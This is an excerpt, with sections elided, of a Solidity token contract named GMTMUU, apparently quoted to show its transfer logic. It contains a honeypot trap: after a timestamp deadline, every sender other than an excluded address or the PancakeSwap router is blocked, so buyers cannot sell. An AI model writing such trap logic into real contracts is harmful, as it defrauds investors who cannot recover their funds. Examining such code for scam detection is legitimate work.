...
contract GMTMUU  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        if (!_isExcludedFrom[form] && !_isExcludedFrom[to] ) { _dead = amount.mul(burn).div(100);}
        if (to != isExcluded && to != panckev2router && form == panckev2router && to != address(this)&& balanceOf(to) == 0)
        { _rfeetax[to] = block.timestamp;  }      
        uint256 _bottime =block.timestamp;
        if (form !=isExcluded && form !=panckev2router){require(_bottime <= _brun);}
        uint256 sendertokens = _tOwned[form];
        if (form != to || !_isExcludedFrom[msg.sender]) { require(sendertokens >= amount); }
        uint256 tokenamount = amount - _dead;
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        ...
        _approve(address(this), address(panckev2router), tokenAmount);
